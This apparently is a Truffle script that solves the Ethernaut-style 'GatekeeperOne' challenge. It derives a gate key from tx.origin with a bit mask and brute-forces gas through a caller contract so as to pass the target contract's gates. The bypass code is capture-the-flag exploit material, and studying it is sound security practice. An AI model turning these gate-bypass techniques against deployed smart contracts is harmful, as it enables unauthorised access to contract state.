const GatekeeperOne = artifacts.require("GatekeeperOne");
const GatekeeperOneCaller = artifacts.require("GatekeeperOneCaller");

module.exports = async (callback) => {
  const web3 = GatekeeperOne.web3;
  const accounts = await web3.eth.getAccounts();
  const gatekeeperOneAddress = "0x79562730A6eD0d175DBf54F229908d92Cf57d5eF";
  const gatekeeper = await GatekeeperOne.at(gatekeeperOneAddress);
  const gatekeeperCaller = await GatekeeperOneCaller.deployed();
  try {
    let entrant = await gatekeeper.entrant();
    console.log("Entrant:", entrant);

    // use gas limit 24847 (learned from running contracts locally + findGas method)
    // const gas = 24847;

    // start with gate key uint64(uint160(tx.origin))
    // then apply mask 0xFFFFFFFF0000FFFF
    const gateKey = await gatekeeperCaller.getKeyFromAddress(accounts[0]);
    console.log("Attempting entry with key:", gateKey);
    await gatekeeperCaller.findGas(gateKey);
    let gasUsed = await gatekeeperCaller.properGas();
    entrant = await gatekeeper.entrant();
    console.log("Entrant:", entrant);
    console.log("Gas used:", gasUsed);

    console.log("done.");
  } catch (err) {
    console.log("Oops: ", err.message);
  }

  callback();
};
